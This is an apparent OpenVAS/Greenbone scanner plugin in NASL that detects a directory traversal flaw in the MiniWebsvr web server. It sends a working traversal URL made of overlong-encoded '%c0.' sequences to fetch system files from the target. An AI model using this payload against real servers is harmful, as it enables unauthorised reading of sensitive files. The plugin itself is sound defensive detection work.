# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100638");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-05-14 12:04:31 +0200 (Fri, 14 May 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("MiniWebsvr <= 0.0.10 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("MiniWebSvr/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"MiniWebsvr is prone to a directory traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to traverse
  through arbitrary directories and gain access to sensitive information.");

  script_tag(name:"affected", value:"MiniWebsvr 0.0.10 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:8080);

banner = http_get_remote_headers(port: port);
if (!banner || "MiniWebSvr" >!< banner)
  exit(0);

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];

  url = "/c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./" + file;

  if (http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
